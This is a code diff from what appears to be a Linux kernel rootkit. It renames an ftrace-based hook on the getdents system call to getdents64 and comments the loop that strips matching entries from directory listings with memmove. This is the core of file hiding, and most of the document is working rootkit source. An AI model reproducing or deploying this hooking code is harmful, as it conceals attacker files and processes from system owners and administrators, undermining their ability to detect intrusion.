@@ -2,29 +2,29 @@
 #include "utils/excludes/string_filtering.h"
 #include "utils/proc_utils.h"
 #include "utils/ftrace_utils.h"
-#include "hooks/x64_sys_getdents.h"
+#include "hooks/x64_sys_getdents64.h"
 
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0)
-asmlinkage long (*orig_getdents)(unsigned int fd, char __user *dirp, unsigned int count);
+asmlinkage long (*orig_getdents64)(unsigned int fd, char __user *dirp, unsigned int count);
 
-asmlinkage long hook_getdents(unsigned int fd, char __user *dirp, unsigned int count) {
-    long ret = orig_getdents(fd, dirp, count);
-    return hook_getdents_impl(fd, dirp, ret);
+asmlinkage long hook_getdents64(unsigned int fd, char __user *dirp, unsigned int count) {
+    long ret = orig_getdents64(fd, dirp, count);
+    return hook_getdents64_impl(fd, dirp, ret);
 }
 #else
-asmlinkage long (*orig_getdents)(const struct pt_regs *regs);
+asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 
-asmlinkage int hook_getdents(const struct pt_regs *regs) {
+asmlinkage int hook_getdents64(const struct pt_regs *regs) {
     unsigned int fd = regs->di;
     char __user *dirp = (char __user *)regs->si;
-    long ret = orig_getdents(regs);
-    return hook_getdents_impl(fd, dirp, ret);
+    long ret = orig_getdents64(regs);
+    return hook_getdents64_impl(fd, dirp, ret);
 }
 #endif
 
 
-long hook_getdents_impl(unsigned int fd, char __user *dirp, long ret) {
+long hook_getdents64_impl(unsigned int fd, char __user *dirp, long ret) {
     long new_ret = ret; // total bytes after filtering
     unsigned long offset = 0;
     unsigned long bytes_left;
@@ -87,12 +87,12 @@ long hook_getdents_impl(unsigned int fd, char __user *dirp, long ret) {
         }
 
 shift_and_iter:
-        if (shift_by > 0) {
+        if (shift_by > 0) { // need to use shift_by rather than d->d_reclen as it would change after memmove
             memmove(d, (char *)d + shift_by, bytes_left - shift_by);
             new_ret -= shift_by;
             bytes_left -= shift_by;
         } else {
-            offset += d->d_reclen;
+            offset += d->d_reclen; // no need to change offset if no shifting was done
             bytes_left -= d->d_reclen;
         }
         continue;
